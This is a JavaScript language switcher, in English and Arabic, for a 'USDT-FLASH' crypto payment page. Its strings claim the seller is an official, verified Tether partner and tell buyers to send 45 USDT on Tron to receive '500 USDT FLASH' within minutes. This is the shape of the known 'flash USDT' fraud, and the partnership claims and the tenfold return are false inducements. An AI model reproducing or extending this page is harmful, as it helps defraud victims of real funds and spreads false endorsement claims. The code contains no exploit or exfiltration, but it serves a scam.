// Payment Page Language Switcher
const translations = {
    en: {
        pageTitle: 'USDT-FLASH - Payment',
        home: 'Home',
        officialPartner: 'Official Partner',
        verifiedPartner: 'Verified Tether Partner',
        visitTether: 'Visit Tether.to',
        completePayment: '💳 Complete Payment - Trial Package',
        paymentRequired: 'Payment Required',
        sendExactly: 'Send exactly this amount to complete your purchase (amount includes transfer fees)',
        scanQR: '📱 Scan QR Code',
        copyAddress: 'Copy Address',
        verifyAddress: 'Verify Address',
        paymentInstructions: '💳 Payment Instructions',
        sendAmount: 'Send exactly',
        useNetwork: 'Use',
        network: 'Tron (TRC20) network',
        receive: 'Receive',
        deliveryTime: 'Delivery in',
        minutes: '2-5 minutes',
        txIdLabel: 'Transaction ID (Hash) - TXID:',
        txIdPlaceholder: 'Enter your TRC20 transaction hash',
        completeBtn: '💳 COMPLETE PAYMENT',
        dashboardBtn: 'GO TO DASHBOARD',
        processing: 'Processing Payment...',
        pleaseWait: 'Please wait while we verify your transaction'
    },
    ar: {
        pageTitle: 'USDT-FLASH - الدفع',
        home: 'الرئيسية',
        officialPartner: 'شريك رسمي',
        verifiedPartner: 'شريك Tether معتمد',
        visitTether: 'زيارة Tether.to',
        completePayment: '💳 إتمام الدفع - الباقة التجريبية',
        paymentRequired: 'المبلغ المطلوب',
        sendExactly: 'أرسل هذا المبلغ بالضبط لإتمام الشراء (المبلغ يشمل رسوم التحويل)',
        scanQR: '📱 مسح رمز QR',
        copyAddress: 'نسخ العنوان',
        verifyAddress: 'التحقق من العنوان',
        paymentInstructions: '💳 تعليمات الدفع',
        sendAmount: 'أرسل بالضبط',
        useNetwork: 'استخدم',
        network: 'شبكة Tron (TRC20)',
        receive: 'استلم',
        deliveryTime: 'التسليم خلال',
        minutes: '2-5 دقائق',
        txIdLabel: 'معرف المعاملة (Hash) - TXID:',
        txIdPlaceholder: 'أدخل معرف معاملة TRC20',
        completeBtn: '💳 إتمام الدفع',
        dashboardBtn: 'الذهاب للوحة التحكم',
        processing: 'جاري معالجة الدفع...',
        pleaseWait: 'يرجى الانتظار بينما نتحقق من معاملتك'
    }
};

function switchLanguage(lang) {
    const t = translations[lang];
    const isArabic = lang === 'ar';
    
    // Update HTML attributes
    document.documentElement.lang = lang;
    document.documentElement.dir = isArabic ? 'rtl' : 'ltr';
    document.title = t.pageTitle;
    
    // Update text content
    const updates = {
        '.tether-button:has(.fa-home)': t.home,
        '.tether-badge': `<i class="fas fa-check-circle text-xs"></i> ${t.officialPartner}`,
        '.tether-official-bar span:first-child': t.verifiedPartner,
        '.tether-official-bar a span': t.visitTether,
        'h2.tether-highlight': t.completePayment,
        '.text-center.bg-gray-50 h3': t.paymentRequired,
        '.text-center.bg-gray-50 p': t.sendExactly,
        '.simple-border h4:first-child': t.scanQR,
        'button[onclick="copyAddress()"]': `<i class="fas fa-copy mr-2"></i>${t.copyAddress}`,
        'button[onclick="verifyAddress()"]': `<i class="fas fa-check mr-2"></i>${t.verifyAddress}`,
        '.simple-border h4:nth-of-type(2)': t.paymentInstructions,
        'label[for="txId"]': t.txIdLabel,
        'button[type="submit"]': t.completeBtn,
        'button[onclick*="account-info"]': t.dashboardBtn,
        '.loading-content h3': t.processing,
        '.loading-content p': t.pleaseWait
    };
    
    Object.entries(updates).forEach(([selector, text]) => {
        const el = document.querySelector(selector);
        if (el) {
            if (text.includes('<')) {
                el.innerHTML = text;
            } else {
                el.textContent = text;
            }
        }
    });
    
    // Update placeholder
    const txInput = document.getElementById('txId');
    if (txInput) txInput.placeholder = t.txIdPlaceholder;
    
    // Update payment instructions
    const instructions = document.querySelectorAll('.simple-border .space-y-3 p');
    if (instructions.length >= 4) {
        instructions[0].innerHTML = `<i class="fas fa-arrow-right text-green-500 ${isArabic ? 'ml-2' : 'mr-2'}"></i>${t.sendAmount} <strong class="tether-highlight">45 USDT</strong>`;
        instructions[1].innerHTML = `<i class="fas fa-network-wired text-blue-500 ${isArabic ? 'ml-2' : 'mr-2'}"></i>${t.useNetwork} <strong>${t.network}</strong>`;
        instructions[2].innerHTML = `<i class="fas fa-gift text-purple-500 ${isArabic ? 'ml-2' : 'mr-2'}"></i>${t.receive} <strong>500 USDT FLASH</strong>`;
        instructions[3].innerHTML = `<i class="fas fa-clock text-orange-500 ${isArabic ? 'ml-2' : 'mr-2'}"></i>${t.deliveryTime} <strong>${t.minutes}</strong>`;
    }
    
    // Update button styles
    const enBtn = document.getElementById('enBtn');
    const arBtn = document.getElementById('arBtn');
    if (enBtn && arBtn) {
        if (isArabic) {
            enBtn.className = 'flex items-center px-3 py-2 bg-gray-100 text-gray-600 rounded-lg hover:bg-gray-200 transition-colors';
            arBtn.className = 'flex items-center px-3 py-2 bg-blue-100 text-blue-800 rounded-lg hover:bg-blue-200 transition-colors';
        } else {
            enBtn.className = 'flex items-center px-3 py-2 bg-blue-100 text-blue-800 rounded-lg hover:bg-blue-200 transition-colors';
            arBtn.className = 'flex items-center px-3 py-2 bg-gray-100 text-gray-600 rounded-lg hover:bg-gray-200 transition-colors';
        }
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    window.toggleLanguage = (lang) => {
        switchLanguage(lang);
        const warningEn = document.getElementById('warningEn');
        const warningAr = document.getElementById('warningAr');
        if (warningEn && warningAr) {
            if (lang === 'ar') {
                warningEn.classList.add('hidden');
                warningAr.classList.remove('hidden');
            } else {
                warningEn.classList.remove('hidden');
                warningAr.classList.add('hidden');
            }
        }
    };
});
